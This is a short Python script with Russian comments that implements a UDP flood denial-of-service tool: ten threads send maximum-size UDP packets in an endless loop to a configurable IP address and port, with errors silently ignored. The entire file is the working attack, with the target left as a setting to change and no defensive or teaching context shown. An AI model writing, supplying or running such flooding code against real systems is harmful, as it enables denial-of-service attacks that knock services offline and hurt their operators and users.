import socket
import threading

def udp_flood():
    # НАСТРОЙКИ - меняй здесь
    IP = "192.168.1.239"
    PORT = 80
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # Увеличиваем буфер отправки
    
    # Максимальный размер UDP пакета
    data = b'X' * 65507
    
    while True:
        try:
            sock.sendto(data, (IP, PORT))
        except:
            pass

if __name__ == "__main__":
    THREADS = 10
    
    # Запуск потоков
    for i in range(THREADS):
        threading.Thread(target=udp_flood, daemon=True).start()
    
    # Бесконечное ожидание
    threading.Event().wait()
